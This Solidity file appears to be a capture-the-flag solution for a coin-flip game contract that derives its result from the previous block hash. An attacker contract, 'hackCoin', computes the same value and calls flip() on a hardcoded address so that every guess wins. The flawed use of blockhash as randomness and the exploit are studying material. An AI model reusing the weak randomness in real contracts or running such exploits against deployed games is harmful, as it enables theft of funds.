// SPDX-License-Identifier: MIT
pragma solidity ^0.5.0;

import "https://github.com/OpenZeppelin/openzeppelin-contracts/blob/v2.5.0/contracts/math/SafeMath.sol";

contract CoinFlip {

  using SafeMath for uint256;
  uint256 public consecutiveWins;
  uint256 lastHash;
  uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;

  constructor() public {
    consecutiveWins = 0;
  }

  function flip(bool _guess) public returns (bool) {
    uint256 blockValue = uint256(blockhash(block.number.sub(1)));

    if (lastHash == blockValue) {
      revert();
    }

    lastHash = blockValue;
    uint256 coinFlip = blockValue.div(FACTOR);
    bool side = coinFlip == 1 ? true : false;

    if (side == _guess) {
      consecutiveWins++;
      return true;
    } else {
      consecutiveWins = 0;
      return false;
    }
  }
  function blockNum() external view returns (uint256, uint256){
    return (block.number, uint256(blockhash(block.number.sub(1))));
  }
  function answer() external view returns(bool){
    uint256 blockValue = uint256(blockhash(block.number.sub(1)));
    uint256 coinFlip = blockValue.div(FACTOR);
    bool side = coinFlip == 1 ? true : false;

    return side;


  }
}
contract hackCoin{
  
  using SafeMath for uint256;

  uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;
  function answer() external returns(bool){
    uint256 blockValue = uint256(blockhash(block.number.sub(1)));
    uint256 coinFlip = blockValue.div(FACTOR);
    bool side = coinFlip == 1 ? true : false;
    CoinFlip c = CoinFlip(0x24e1C1C8B8aE745e920c9b8fAa1C02B2f44C10fa);
    c.flip(side);

    return side;


  }
}
